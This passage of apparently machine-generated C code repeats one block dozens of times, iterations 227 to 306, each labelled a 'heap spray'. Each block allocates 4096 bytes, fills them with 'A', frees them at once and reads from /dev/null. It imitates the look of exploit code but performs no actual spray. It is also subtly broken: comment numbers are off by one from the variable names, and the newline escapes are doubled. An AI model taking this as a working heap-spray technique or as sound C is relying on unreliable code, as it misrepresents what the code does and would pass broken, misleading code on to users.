    if (fd225 >= 0) {
        char buf225[256];
        read(fd225, buf225, sizeof(buf225));
        close(fd225);
    }
    // Iteration 227
    printf("[*] Heap spray iteration 227\\n");
    void *ptr226 = malloc(4096);
    if (ptr226) {
        memset(ptr226, 0x41, 4096);
        printf("[+] Allocated ptr226\\n");
        free(ptr226);
    }
    int fd226 = open("/dev/null", O_RDONLY);
    if (fd226 >= 0) {
        char buf226[256];
        read(fd226, buf226, sizeof(buf226));
        close(fd226);
    }
    // Iteration 228
    printf("[*] Heap spray iteration 228\\n");
    void *ptr227 = malloc(4096);
    if (ptr227) {
        memset(ptr227, 0x41, 4096);
        printf("[+] Allocated ptr227\\n");
        free(ptr227);
    }
    int fd227 = open("/dev/null", O_RDONLY);
    if (fd227 >= 0) {
        char buf227[256];
        read(fd227, buf227, sizeof(buf227));
        close(fd227);
    }
    // Iteration 229
    printf("[*] Heap spray iteration 229\\n");
    void *ptr228 = malloc(4096);
    if (ptr228) {
        memset(ptr228, 0x41, 4096);
        printf("[+] Allocated ptr228\\n");
        free(ptr228);
    }
    int fd228 = open("/dev/null", O_RDONLY);
    if (fd228 >= 0) {
        char buf228[256];
        read(fd228, buf228, sizeof(buf228));
        close(fd228);
    }
    // Iteration 230
    printf("[*] Heap spray iteration 230\\n");
    void *ptr229 = malloc(4096);
    if (ptr229) {
        memset(ptr229, 0x41, 4096);
        printf("[+] Allocated ptr229\\n");
        free(ptr229);
    }
    int fd229 = open("/dev/null", O_RDONLY);
    if (fd229 >= 0) {
        char buf229[256];
        read(fd229, buf229, sizeof(buf229));
        close(fd229);
    }
    // Iteration 231
    printf("[*] Heap spray iteration 231\\n");
    void *ptr230 = malloc(4096);
    if (ptr230) {
        memset(ptr230, 0x41, 4096);
        printf("[+] Allocated ptr230\\n");
        free(ptr230);
    }
    int fd230 = open("/dev/null", O_RDONLY);
    if (fd230 >= 0) {
        char buf230[256];
        read(fd230, buf230, sizeof(buf230));
        close(fd230);
    }
    // Iteration 232
    printf("[*] Heap spray iteration 232\\n");
    void *ptr231 = malloc(4096);
    if (ptr231) {
        memset(ptr231, 0x41, 4096);
        printf("[+] Allocated ptr231\\n");
        free(ptr231);
    }
    int fd231 = open("/dev/null", O_RDONLY);
    if (fd231 >= 0) {
        char buf231[256];
        read(fd231, buf231, sizeof(buf231));
        close(fd231);
    }
    // Iteration 233
    printf("[*] Heap spray iteration 233\\n");
    void *ptr232 = malloc(4096);
    if (ptr232) {
        memset(ptr232, 0x41, 4096);
        printf("[+] Allocated ptr232\\n");
        free(ptr232);
    }
    int fd232 = open("/dev/null", O_RDONLY);
    if (fd232 >= 0) {
        char buf232[256];
        read(fd232, buf232, sizeof(buf232));
        close(fd232);
    }
    // Iteration 234
    printf("[*] Heap spray iteration 234\\n");
    void *ptr233 = malloc(4096);
    if (ptr233) {
        memset(ptr233, 0x41, 4096);
        printf("[+] Allocated ptr233\\n");
        free(ptr233);
    }
    int fd233 = open("/dev/null", O_RDONLY);
    if (fd233 >= 0) {
        char buf233[256];
        read(fd233, buf233, sizeof(buf233));
        close(fd233);
    }
    // Iteration 235
    printf("[*] Heap spray iteration 235\\n");
    void *ptr234 = malloc(4096);
    if (ptr234) {
        memset(ptr234, 0x41, 4096);
        printf("[+] Allocated ptr234\\n");
        free(ptr234);
    }
    int fd234 = open("/dev/null", O_RDONLY);
    if (fd234 >= 0) {
        char buf234[256];
        read(fd234, buf234, sizeof(buf234));
        close(fd234);
    }
    // Iteration 236
    printf("[*] Heap spray iteration 236\\n");
    void *ptr235 = malloc(4096);
    if (ptr235) {
        memset(ptr235, 0x41, 4096);
        printf("[+] Allocated ptr235\\n");
        free(ptr235);
    }
    int fd235 = open("/dev/null", O_RDONLY);
    if (fd235 >= 0) {
        char buf235[256];
        read(fd235, buf235, sizeof(buf235));
        close(fd235);
    }
    // Iteration 237
    printf("[*] Heap spray iteration 237\\n");
    void *ptr236 = malloc(4096);
    if (ptr236) {
        memset(ptr236, 0x41, 4096);
        printf("[+] Allocated ptr236\\n");
        free(ptr236);
    }
    int fd236 = open("/dev/null", O_RDONLY);
    if (fd236 >= 0) {
        char buf236[256];
        read(fd236, buf236, sizeof(buf236));
        close(fd236);
    }
    // Iteration 238
    printf("[*] Heap spray iteration 238\\n");
    void *ptr237 = malloc(4096);
    if (ptr237) {
        memset(ptr237, 0x41, 4096);
        printf("[+] Allocated ptr237\\n");
        free(ptr237);
    }
    int fd237 = open("/dev/null", O_RDONLY);
    if (fd237 >= 0) {
        char buf237[256];
        read(fd237, buf237, sizeof(buf237));
        close(fd237);
    }
    // Iteration 239
    printf("[*] Heap spray iteration 239\\n");
    void *ptr238 = malloc(4096);
    if (ptr238) {
        memset(ptr238, 0x41, 4096);
        printf("[+] Allocated ptr238\\n");
        free(ptr238);
    }
    int fd238 = open("/dev/null", O_RDONLY);
    if (fd238 >= 0) {
        char buf238[256];
        read(fd238, buf238, sizeof(buf238));
        close(fd238);
    }
    // Iteration 240
    printf("[*] Heap spray iteration 240\\n");
    void *ptr239 = malloc(4096);
    if (ptr239) {
        memset(ptr239, 0x41, 4096);
        printf("[+] Allocated ptr239\\n");
        free(ptr239);
    }
    int fd239 = open("/dev/null", O_RDONLY);
    if (fd239 >= 0) {
        char buf239[256];
        read(fd239, buf239, sizeof(buf239));
        close(fd239);
    }
    // Iteration 241
    printf("[*] Heap spray iteration 241\\n");
    void *ptr240 = malloc(4096);
    if (ptr240) {
        memset(ptr240, 0x41, 4096);
        printf("[+] Allocated ptr240\\n");
        free(ptr240);
    }
    int fd240 = open("/dev/null", O_RDONLY);
    if (fd240 >= 0) {
        char buf240[256];
        read(fd240, buf240, sizeof(buf240));
        close(fd240);
    }
    // Iteration 242
    printf("[*] Heap spray iteration 242\\n");
    void *ptr241 = malloc(4096);
    if (ptr241) {
        memset(ptr241, 0x41, 4096);
        printf("[+] Allocated ptr241\\n");
        free(ptr241);
    }
    int fd241 = open("/dev/null", O_RDONLY);
    if (fd241 >= 0) {
        char buf241[256];
        read(fd241, buf241, sizeof(buf241));
        close(fd241);
    }
    // Iteration 243
    printf("[*] Heap spray iteration 243\\n");
    void *ptr242 = malloc(4096);
    if (ptr242) {
        memset(ptr242, 0x41, 4096);
        printf("[+] Allocated ptr242\\n");
        free(ptr242);
    }
    int fd242 = open("/dev/null", O_RDONLY);
    if (fd242 >= 0) {
        char buf242[256];
        read(fd242, buf242, sizeof(buf242));
        close(fd242);
    }
    // Iteration 244
    printf("[*] Heap spray iteration 244\\n");
    void *ptr243 = malloc(4096);
    if (ptr243) {
        memset(ptr243, 0x41, 4096);
        printf("[+] Allocated ptr243\\n");
        free(ptr243);
    }
    int fd243 = open("/dev/null", O_RDONLY);
    if (fd243 >= 0) {
        char buf243[256];
        read(fd243, buf243, sizeof(buf243));
        close(fd243);
    }
    // Iteration 245
    printf("[*] Heap spray iteration 245\\n");
    void *ptr244 = malloc(4096);
    if (ptr244) {
        memset(ptr244, 0x41, 4096);
        printf("[+] Allocated ptr244\\n");
        free(ptr244);
    }
    int fd244 = open("/dev/null", O_RDONLY);
    if (fd244 >= 0) {
        char buf244[256];
        read(fd244, buf244, sizeof(buf244));
        close(fd244);
    }
    // Iteration 246
    printf("[*] Heap spray iteration 246\\n");
    void *ptr245 = malloc(4096);
    if (ptr245) {
        memset(ptr245, 0x41, 4096);
        printf("[+] Allocated ptr245\\n");
        free(ptr245);
    }
    int fd245 = open("/dev/null", O_RDONLY);
    if (fd245 >= 0) {
        char buf245[256];
        read(fd245, buf245, sizeof(buf245));
        close(fd245);
    }
    // Iteration 247
    printf("[*] Heap spray iteration 247\\n");
    void *ptr246 = malloc(4096);
    if (ptr246) {
        memset(ptr246, 0x41, 4096);
        printf("[+] Allocated ptr246\\n");
        free(ptr246);
    }
    int fd246 = open("/dev/null", O_RDONLY);
    if (fd246 >= 0) {
        char buf246[256];
        read(fd246, buf246, sizeof(buf246));
        close(fd246);
    }
    // Iteration 248
    printf("[*] Heap spray iteration 248\\n");
    void *ptr247 = malloc(4096);
    if (ptr247) {
        memset(ptr247, 0x41, 4096);
        printf("[+] Allocated ptr247\\n");
        free(ptr247);
    }
    int fd247 = open("/dev/null", O_RDONLY);
    if (fd247 >= 0) {
        char buf247[256];
        read(fd247, buf247, sizeof(buf247));
        close(fd247);
    }
    // Iteration 249
    printf("[*] Heap spray iteration 249\\n");
    void *ptr248 = malloc(4096);
    if (ptr248) {
        memset(ptr248, 0x41, 4096);
        printf("[+] Allocated ptr248\\n");
        free(ptr248);
    }
    int fd248 = open("/dev/null", O_RDONLY);
    if (fd248 >= 0) {
        char buf248[256];
        read(fd248, buf248, sizeof(buf248));
        close(fd248);
    }
    // Iteration 250
    printf("[*] Heap spray iteration 250\\n");
    void *ptr249 = malloc(4096);
    if (ptr249) {
        memset(ptr249, 0x41, 4096);
        printf("[+] Allocated ptr249\\n");
        free(ptr249);
    }
    int fd249 = open("/dev/null", O_RDONLY);
    if (fd249 >= 0) {
        char buf249[256];
        read(fd249, buf249, sizeof(buf249));
        close(fd249);
    }
    // Iteration 251
    printf("[*] Heap spray iteration 251\\n");
    void *ptr250 = malloc(4096);
    if (ptr250) {
        memset(ptr250, 0x41, 4096);
        printf("[+] Allocated ptr250\\n");
        free(ptr250);
    }
    int fd250 = open("/dev/null", O_RDONLY);
    if (fd250 >= 0) {
        char buf250[256];
        read(fd250, buf250, sizeof(buf250));
        close(fd250);
    }
    // Iteration 252
    printf("[*] Heap spray iteration 252\\n");
    void *ptr251 = malloc(4096);
    if (ptr251) {
        memset(ptr251, 0x41, 4096);
        printf("[+] Allocated ptr251\\n");
        free(ptr251);
    }
    int fd251 = open("/dev/null", O_RDONLY);
    if (fd251 >= 0) {
        char buf251[256];
        read(fd251, buf251, sizeof(buf251));
        close(fd251);
    }
    // Iteration 253
    printf("[*] Heap spray iteration 253\\n");
    void *ptr252 = malloc(4096);
    if (ptr252) {
        memset(ptr252, 0x41, 4096);
        printf("[+] Allocated ptr252\\n");
        free(ptr252);
    }
    int fd252 = open("/dev/null", O_RDONLY);
    if (fd252 >= 0) {
        char buf252[256];
        read(fd252, buf252, sizeof(buf252));
        close(fd252);
    }
    // Iteration 254
    printf("[*] Heap spray iteration 254\\n");
    void *ptr253 = malloc(4096);
    if (ptr253) {
        memset(ptr253, 0x41, 4096);
        printf("[+] Allocated ptr253\\n");
        free(ptr253);
    }
    int fd253 = open("/dev/null", O_RDONLY);
    if (fd253 >= 0) {
        char buf253[256];
        read(fd253, buf253, sizeof(buf253));
        close(fd253);
    }
    // Iteration 255
    printf("[*] Heap spray iteration 255\\n");
    void *ptr254 = malloc(4096);
    if (ptr254) {
        memset(ptr254, 0x41, 4096);
        printf("[+] Allocated ptr254\\n");
        free(ptr254);
    }
    int fd254 = open("/dev/null", O_RDONLY);
    if (fd254 >= 0) {
        char buf254[256];
        read(fd254, buf254, sizeof(buf254));
        close(fd254);
    }
    // Iteration 256
    printf("[*] Heap spray iteration 256\\n");
    void *ptr255 = malloc(4096);
    if (ptr255) {
        memset(ptr255, 0x41, 4096);
        printf("[+] Allocated ptr255\\n");
        free(ptr255);
    }
    int fd255 = open("/dev/null", O_RDONLY);
    if (fd255 >= 0) {
        char buf255[256];
        read(fd255, buf255, sizeof(buf255));
        close(fd255);
    }
    // Iteration 257
    printf("[*] Heap spray iteration 257\\n");
    void *ptr256 = malloc(4096);
    if (ptr256) {
        memset(ptr256, 0x41, 4096);
        printf("[+] Allocated ptr256\\n");
        free(ptr256);
    }
    int fd256 = open("/dev/null", O_RDONLY);
    if (fd256 >= 0) {
        char buf256[256];
        read(fd256, buf256, sizeof(buf256));
        close(fd256);
    }
    // Iteration 258
    printf("[*] Heap spray iteration 258\\n");
    void *ptr257 = malloc(4096);
    if (ptr257) {
        memset(ptr257, 0x41, 4096);
        printf("[+] Allocated ptr257\\n");
        free(ptr257);
    }
    int fd257 = open("/dev/null", O_RDONLY);
    if (fd257 >= 0) {
        char buf257[256];
        read(fd257, buf257, sizeof(buf257));
        close(fd257);
    }
    // Iteration 259
    printf("[*] Heap spray iteration 259\\n");
    void *ptr258 = malloc(4096);
    if (ptr258) {
        memset(ptr258, 0x41, 4096);
        printf("[+] Allocated ptr258\\n");
        free(ptr258);
    }
    int fd258 = open("/dev/null", O_RDONLY);
    if (fd258 >= 0) {
        char buf258[256];
        read(fd258, buf258, sizeof(buf258));
        close(fd258);
    }
    // Iteration 260
    printf("[*] Heap spray iteration 260\\n");
    void *ptr259 = malloc(4096);
    if (ptr259) {
        memset(ptr259, 0x41, 4096);
        printf("[+] Allocated ptr259\\n");
        free(ptr259);
    }
    int fd259 = open("/dev/null", O_RDONLY);
    if (fd259 >= 0) {
        char buf259[256];
        read(fd259, buf259, sizeof(buf259));
        close(fd259);
    }
    // Iteration 261
    printf("[*] Heap spray iteration 261\\n");
    void *ptr260 = malloc(4096);
    if (ptr260) {
        memset(ptr260, 0x41, 4096);
        printf("[+] Allocated ptr260\\n");
        free(ptr260);
    }
    int fd260 = open("/dev/null", O_RDONLY);
    if (fd260 >= 0) {
        char buf260[256];
        read(fd260, buf260, sizeof(buf260));
        close(fd260);
    }
    // Iteration 262
    printf("[*] Heap spray iteration 262\\n");
    void *ptr261 = malloc(4096);
    if (ptr261) {
        memset(ptr261, 0x41, 4096);
        printf("[+] Allocated ptr261\\n");
        free(ptr261);
    }
    int fd261 = open("/dev/null", O_RDONLY);
    if (fd261 >= 0) {
        char buf261[256];
        read(fd261, buf261, sizeof(buf261));
        close(fd261);
    }
    // Iteration 263
    printf("[*] Heap spray iteration 263\\n");
    void *ptr262 = malloc(4096);
    if (ptr262) {
        memset(ptr262, 0x41, 4096);
        printf("[+] Allocated ptr262\\n");
        free(ptr262);
    }
    int fd262 = open("/dev/null", O_RDONLY);
    if (fd262 >= 0) {
        char buf262[256];
        read(fd262, buf262, sizeof(buf262));
        close(fd262);
    }
    // Iteration 264
    printf("[*] Heap spray iteration 264\\n");
    void *ptr263 = malloc(4096);
    if (ptr263) {
        memset(ptr263, 0x41, 4096);
        printf("[+] Allocated ptr263\\n");
        free(ptr263);
    }
    int fd263 = open("/dev/null", O_RDONLY);
    if (fd263 >= 0) {
        char buf263[256];
        read(fd263, buf263, sizeof(buf263));
        close(fd263);
    }
    // Iteration 265
    printf("[*] Heap spray iteration 265\\n");
    void *ptr264 = malloc(4096);
    if (ptr264) {
        memset(ptr264, 0x41, 4096);
        printf("[+] Allocated ptr264\\n");
        free(ptr264);
    }
    int fd264 = open("/dev/null", O_RDONLY);
    if (fd264 >= 0) {
        char buf264[256];
        read(fd264, buf264, sizeof(buf264));
        close(fd264);
    }
    // Iteration 266
    printf("[*] Heap spray iteration 266\\n");
    void *ptr265 = malloc(4096);
    if (ptr265) {
        memset(ptr265, 0x41, 4096);
        printf("[+] Allocated ptr265\\n");
        free(ptr265);
    }
    int fd265 = open("/dev/null", O_RDONLY);
    if (fd265 >= 0) {
        char buf265[256];
        read(fd265, buf265, sizeof(buf265));
        close(fd265);
    }
    // Iteration 267
    printf("[*] Heap spray iteration 267\\n");
    void *ptr266 = malloc(4096);
    if (ptr266) {
        memset(ptr266, 0x41, 4096);
        printf("[+] Allocated ptr266\\n");
        free(ptr266);
    }
    int fd266 = open("/dev/null", O_RDONLY);
    if (fd266 >= 0) {
        char buf266[256];
        read(fd266, buf266, sizeof(buf266));
        close(fd266);
    }
    // Iteration 268
    printf("[*] Heap spray iteration 268\\n");
    void *ptr267 = malloc(4096);
    if (ptr267) {
        memset(ptr267, 0x41, 4096);
        printf("[+] Allocated ptr267\\n");
        free(ptr267);
    }
    int fd267 = open("/dev/null", O_RDONLY);
    if (fd267 >= 0) {
        char buf267[256];
        read(fd267, buf267, sizeof(buf267));
        close(fd267);
    }
    // Iteration 269
    printf("[*] Heap spray iteration 269\\n");
    void *ptr268 = malloc(4096);
    if (ptr268) {
        memset(ptr268, 0x41, 4096);
        printf("[+] Allocated ptr268\\n");
        free(ptr268);
    }
    int fd268 = open("/dev/null", O_RDONLY);
    if (fd268 >= 0) {
        char buf268[256];
        read(fd268, buf268, sizeof(buf268));
        close(fd268);
    }
    // Iteration 270
    printf("[*] Heap spray iteration 270\\n");
    void *ptr269 = malloc(4096);
    if (ptr269) {
        memset(ptr269, 0x41, 4096);
        printf("[+] Allocated ptr269\\n");
        free(ptr269);
    }
    int fd269 = open("/dev/null", O_RDONLY);
    if (fd269 >= 0) {
        char buf269[256];
        read(fd269, buf269, sizeof(buf269));
        close(fd269);
    }
    // Iteration 271
    printf("[*] Heap spray iteration 271\\n");
    void *ptr270 = malloc(4096);
    if (ptr270) {
        memset(ptr270, 0x41, 4096);
        printf("[+] Allocated ptr270\\n");
        free(ptr270);
    }
    int fd270 = open("/dev/null", O_RDONLY);
    if (fd270 >= 0) {
        char buf270[256];
        read(fd270, buf270, sizeof(buf270));
        close(fd270);
    }
    // Iteration 272
    printf("[*] Heap spray iteration 272\\n");
    void *ptr271 = malloc(4096);
    if (ptr271) {
        memset(ptr271, 0x41, 4096);
        printf("[+] Allocated ptr271\\n");
        free(ptr271);
    }
    int fd271 = open("/dev/null", O_RDONLY);
    if (fd271 >= 0) {
        char buf271[256];
        read(fd271, buf271, sizeof(buf271));
        close(fd271);
    }
    // Iteration 273
    printf("[*] Heap spray iteration 273\\n");
    void *ptr272 = malloc(4096);
    if (ptr272) {
        memset(ptr272, 0x41, 4096);
        printf("[+] Allocated ptr272\\n");
        free(ptr272);
    }
    int fd272 = open("/dev/null", O_RDONLY);
    if (fd272 >= 0) {
        char buf272[256];
        read(fd272, buf272, sizeof(buf272));
        close(fd272);
    }
    // Iteration 274
    printf("[*] Heap spray iteration 274\\n");
    void *ptr273 = malloc(4096);
    if (ptr273) {
        memset(ptr273, 0x41, 4096);
        printf("[+] Allocated ptr273\\n");
        free(ptr273);
    }
    int fd273 = open("/dev/null", O_RDONLY);
    if (fd273 >= 0) {
        char buf273[256];
        read(fd273, buf273, sizeof(buf273));
        close(fd273);
    }
    // Iteration 275
    printf("[*] Heap spray iteration 275\\n");
    void *ptr274 = malloc(4096);
    if (ptr274) {
        memset(ptr274, 0x41, 4096);
        printf("[+] Allocated ptr274\\n");
        free(ptr274);
    }
    int fd274 = open("/dev/null", O_RDONLY);
    if (fd274 >= 0) {
        char buf274[256];
        read(fd274, buf274, sizeof(buf274));
        close(fd274);
    }
    // Iteration 276
    printf("[*] Heap spray iteration 276\\n");
    void *ptr275 = malloc(4096);
    if (ptr275) {
        memset(ptr275, 0x41, 4096);
        printf("[+] Allocated ptr275\\n");
        free(ptr275);
    }
    int fd275 = open("/dev/null", O_RDONLY);
    if (fd275 >= 0) {
        char buf275[256];
        read(fd275, buf275, sizeof(buf275));
        close(fd275);
    }
    // Iteration 277
    printf("[*] Heap spray iteration 277\\n");
    void *ptr276 = malloc(4096);
    if (ptr276) {
        memset(ptr276, 0x41, 4096);
        printf("[+] Allocated ptr276\\n");
        free(ptr276);
    }
    int fd276 = open("/dev/null", O_RDONLY);
    if (fd276 >= 0) {
        char buf276[256];
        read(fd276, buf276, sizeof(buf276));
        close(fd276);
    }
    // Iteration 278
    printf("[*] Heap spray iteration 278\\n");
    void *ptr277 = malloc(4096);
    if (ptr277) {
        memset(ptr277, 0x41, 4096);
        printf("[+] Allocated ptr277\\n");
        free(ptr277);
    }
    int fd277 = open("/dev/null", O_RDONLY);
    if (fd277 >= 0) {
        char buf277[256];
        read(fd277, buf277, sizeof(buf277));
        close(fd277);
    }
    // Iteration 279
    printf("[*] Heap spray iteration 279\\n");
    void *ptr278 = malloc(4096);
    if (ptr278) {
        memset(ptr278, 0x41, 4096);
        printf("[+] Allocated ptr278\\n");
        free(ptr278);
    }
    int fd278 = open("/dev/null", O_RDONLY);
    if (fd278 >= 0) {
        char buf278[256];
        read(fd278, buf278, sizeof(buf278));
        close(fd278);
    }
    // Iteration 280
    printf("[*] Heap spray iteration 280\\n");
    void *ptr279 = malloc(4096);
    if (ptr279) {
        memset(ptr279, 0x41, 4096);
        printf("[+] Allocated ptr279\\n");
        free(ptr279);
    }
    int fd279 = open("/dev/null", O_RDONLY);
    if (fd279 >= 0) {
        char buf279[256];
        read(fd279, buf279, sizeof(buf279));
        close(fd279);
    }
    // Iteration 281
    printf("[*] Heap spray iteration 281\\n");
    void *ptr280 = malloc(4096);
    if (ptr280) {
        memset(ptr280, 0x41, 4096);
        printf("[+] Allocated ptr280\\n");
        free(ptr280);
    }
    int fd280 = open("/dev/null", O_RDONLY);
    if (fd280 >= 0) {
        char buf280[256];
        read(fd280, buf280, sizeof(buf280));
        close(fd280);
    }
    // Iteration 282
    printf("[*] Heap spray iteration 282\\n");
    void *ptr281 = malloc(4096);
    if (ptr281) {
        memset(ptr281, 0x41, 4096);
        printf("[+] Allocated ptr281\\n");
        free(ptr281);
    }
    int fd281 = open("/dev/null", O_RDONLY);
    if (fd281 >= 0) {
        char buf281[256];
        read(fd281, buf281, sizeof(buf281));
        close(fd281);
    }
    // Iteration 283
    printf("[*] Heap spray iteration 283\\n");
    void *ptr282 = malloc(4096);
    if (ptr282) {
        memset(ptr282, 0x41, 4096);
        printf("[+] Allocated ptr282\\n");
        free(ptr282);
    }
    int fd282 = open("/dev/null", O_RDONLY);
    if (fd282 >= 0) {
        char buf282[256];
        read(fd282, buf282, sizeof(buf282));
        close(fd282);
    }
    // Iteration 284
    printf("[*] Heap spray iteration 284\\n");
    void *ptr283 = malloc(4096);
    if (ptr283) {
        memset(ptr283, 0x41, 4096);
        printf("[+] Allocated ptr283\\n");
        free(ptr283);
    }
    int fd283 = open("/dev/null", O_RDONLY);
    if (fd283 >= 0) {
        char buf283[256];
        read(fd283, buf283, sizeof(buf283));
        close(fd283);
    }
    // Iteration 285
    printf("[*] Heap spray iteration 285\\n");
    void *ptr284 = malloc(4096);
    if (ptr284) {
        memset(ptr284, 0x41, 4096);
        printf("[+] Allocated ptr284\\n");
        free(ptr284);
    }
    int fd284 = open("/dev/null", O_RDONLY);
    if (fd284 >= 0) {
        char buf284[256];
        read(fd284, buf284, sizeof(buf284));
        close(fd284);
    }
    // Iteration 286
    printf("[*] Heap spray iteration 286\\n");
    void *ptr285 = malloc(4096);
    if (ptr285) {
        memset(ptr285, 0x41, 4096);
        printf("[+] Allocated ptr285\\n");
        free(ptr285);
    }
    int fd285 = open("/dev/null", O_RDONLY);
    if (fd285 >= 0) {
        char buf285[256];
        read(fd285, buf285, sizeof(buf285));
        close(fd285);
    }
    // Iteration 287
    printf("[*] Heap spray iteration 287\\n");
    void *ptr286 = malloc(4096);
    if (ptr286) {
        memset(ptr286, 0x41, 4096);
        printf("[+] Allocated ptr286\\n");
        free(ptr286);
    }
    int fd286 = open("/dev/null", O_RDONLY);
    if (fd286 >= 0) {
        char buf286[256];
        read(fd286, buf286, sizeof(buf286));
        close(fd286);
    }
    // Iteration 288
    printf("[*] Heap spray iteration 288\\n");
    void *ptr287 = malloc(4096);
    if (ptr287) {
        memset(ptr287, 0x41, 4096);
        printf("[+] Allocated ptr287\\n");
        free(ptr287);
    }
    int fd287 = open("/dev/null", O_RDONLY);
    if (fd287 >= 0) {
        char buf287[256];
        read(fd287, buf287, sizeof(buf287));
        close(fd287);
    }
    // Iteration 289
    printf("[*] Heap spray iteration 289\\n");
    void *ptr288 = malloc(4096);
    if (ptr288) {
        memset(ptr288, 0x41, 4096);
        printf("[+] Allocated ptr288\\n");
        free(ptr288);
    }
    int fd288 = open("/dev/null", O_RDONLY);
    if (fd288 >= 0) {
        char buf288[256];
        read(fd288, buf288, sizeof(buf288));
        close(fd288);
    }
    // Iteration 290
    printf("[*] Heap spray iteration 290\\n");
    void *ptr289 = malloc(4096);
    if (ptr289) {
        memset(ptr289, 0x41, 4096);
        printf("[+] Allocated ptr289\\n");
        free(ptr289);
    }
    int fd289 = open("/dev/null", O_RDONLY);
    if (fd289 >= 0) {
        char buf289[256];
        read(fd289, buf289, sizeof(buf289));
        close(fd289);
    }
    // Iteration 291
    printf("[*] Heap spray iteration 291\\n");
    void *ptr290 = malloc(4096);
    if (ptr290) {
        memset(ptr290, 0x41, 4096);
        printf("[+] Allocated ptr290\\n");
        free(ptr290);
    }
    int fd290 = open("/dev/null", O_RDONLY);
    if (fd290 >= 0) {
        char buf290[256];
        read(fd290, buf290, sizeof(buf290));
        close(fd290);
    }
    // Iteration 292
    printf("[*] Heap spray iteration 292\\n");
    void *ptr291 = malloc(4096);
    if (ptr291) {
        memset(ptr291, 0x41, 4096);
        printf("[+] Allocated ptr291\\n");
        free(ptr291);
    }
    int fd291 = open("/dev/null", O_RDONLY);
    if (fd291 >= 0) {
        char buf291[256];
        read(fd291, buf291, sizeof(buf291));
        close(fd291);
    }
    // Iteration 293
    printf("[*] Heap spray iteration 293\\n");
    void *ptr292 = malloc(4096);
    if (ptr292) {
        memset(ptr292, 0x41, 4096);
        printf("[+] Allocated ptr292\\n");
        free(ptr292);
    }
    int fd292 = open("/dev/null", O_RDONLY);
    if (fd292 >= 0) {
        char buf292[256];
        read(fd292, buf292, sizeof(buf292));
        close(fd292);
    }
    // Iteration 294
    printf("[*] Heap spray iteration 294\\n");
    void *ptr293 = malloc(4096);
    if (ptr293) {
        memset(ptr293, 0x41, 4096);
        printf("[+] Allocated ptr293\\n");
        free(ptr293);
    }
    int fd293 = open("/dev/null", O_RDONLY);
    if (fd293 >= 0) {
        char buf293[256];
        read(fd293, buf293, sizeof(buf293));
        close(fd293);
    }
    // Iteration 295
    printf("[*] Heap spray iteration 295\\n");
    void *ptr294 = malloc(4096);
    if (ptr294) {
        memset(ptr294, 0x41, 4096);
        printf("[+] Allocated ptr294\\n");
        free(ptr294);
    }
    int fd294 = open("/dev/null", O_RDONLY);
    if (fd294 >= 0) {
        char buf294[256];
        read(fd294, buf294, sizeof(buf294));
        close(fd294);
    }
    // Iteration 296
    printf("[*] Heap spray iteration 296\\n");
    void *ptr295 = malloc(4096);
    if (ptr295) {
        memset(ptr295, 0x41, 4096);
        printf("[+] Allocated ptr295\\n");
        free(ptr295);
    }
    int fd295 = open("/dev/null", O_RDONLY);
    if (fd295 >= 0) {
        char buf295[256];
        read(fd295, buf295, sizeof(buf295));
        close(fd295);
    }
    // Iteration 297
    printf("[*] Heap spray iteration 297\\n");
    void *ptr296 = malloc(4096);
    if (ptr296) {
        memset(ptr296, 0x41, 4096);
        printf("[+] Allocated ptr296\\n");
        free(ptr296);
    }
    int fd296 = open("/dev/null", O_RDONLY);
    if (fd296 >= 0) {
        char buf296[256];
        read(fd296, buf296, sizeof(buf296));
        close(fd296);
    }
    // Iteration 298
    printf("[*] Heap spray iteration 298\\n");
    void *ptr297 = malloc(4096);
    if (ptr297) {
        memset(ptr297, 0x41, 4096);
        printf("[+] Allocated ptr297\\n");
        free(ptr297);
    }
    int fd297 = open("/dev/null", O_RDONLY);
    if (fd297 >= 0) {
        char buf297[256];
        read(fd297, buf297, sizeof(buf297));
        close(fd297);
    }
    // Iteration 299
    printf("[*] Heap spray iteration 299\\n");
    void *ptr298 = malloc(4096);
    if (ptr298) {
        memset(ptr298, 0x41, 4096);
        printf("[+] Allocated ptr298\\n");
        free(ptr298);
    }
    int fd298 = open("/dev/null", O_RDONLY);
    if (fd298 >= 0) {
        char buf298[256];
        read(fd298, buf298, sizeof(buf298));
        close(fd298);
    }
    // Iteration 300
    printf("[*] Heap spray iteration 300\\n");
    void *ptr299 = malloc(4096);
    if (ptr299) {
        memset(ptr299, 0x41, 4096);
        printf("[+] Allocated ptr299\\n");
        free(ptr299);
    }
    int fd299 = open("/dev/null", O_RDONLY);
    if (fd299 >= 0) {
        char buf299[256];
        read(fd299, buf299, sizeof(buf299));
        close(fd299);
    }
    // Iteration 301
    printf("[*] Heap spray iteration 301\\n");
    void *ptr300 = malloc(4096);
    if (ptr300) {
        memset(ptr300, 0x41, 4096);
        printf("[+] Allocated ptr300\\n");
        free(ptr300);
    }
    int fd300 = open("/dev/null", O_RDONLY);
    if (fd300 >= 0) {
        char buf300[256];
        read(fd300, buf300, sizeof(buf300));
        close(fd300);
    }
    // Iteration 302
    printf("[*] Heap spray iteration 302\\n");
    void *ptr301 = malloc(4096);
    if (ptr301) {
        memset(ptr301, 0x41, 4096);
        printf("[+] Allocated ptr301\\n");
        free(ptr301);
    }
    int fd301 = open("/dev/null", O_RDONLY);
    if (fd301 >= 0) {
        char buf301[256];
        read(fd301, buf301, sizeof(buf301));
        close(fd301);
    }
    // Iteration 303
    printf("[*] Heap spray iteration 303\\n");
    void *ptr302 = malloc(4096);
    if (ptr302) {
        memset(ptr302, 0x41, 4096);
        printf("[+] Allocated ptr302\\n");
        free(ptr302);
    }
    int fd302 = open("/dev/null", O_RDONLY);
    if (fd302 >= 0) {
        char buf302[256];
        read(fd302, buf302, sizeof(buf302));
        close(fd302);
    }
    // Iteration 304
    printf("[*] Heap spray iteration 304\\n");
    void *ptr303 = malloc(4096);
    if (ptr303) {
        memset(ptr303, 0x41, 4096);
        printf("[+] Allocated ptr303\\n");
        free(ptr303);
    }
    int fd303 = open("/dev/null", O_RDONLY);
    if (fd303 >= 0) {
        char buf303[256];
        read(fd303, buf303, sizeof(buf303));
        close(fd303);
    }
    // Iteration 305
    printf("[*] Heap spray iteration 305\\n");
    void *ptr304 = malloc(4096);
    if (ptr304) {
        memset(ptr304, 0x41, 4096);
        printf("[+] Allocated ptr304\\n");
        free(ptr304);
    }
    int fd304 = open("/dev/null", O_RDONLY);
    if (fd304 >= 0) {
        char buf304[256];
        read(fd304, buf304, sizeof(buf304));
        close(fd304);
    }
    // Iteration 306
    printf("[*] Heap spray iteration 306\\n");
    void *ptr305 = malloc(4096);
    if (ptr305) {
        memset(ptr305, 0x41, 4096);
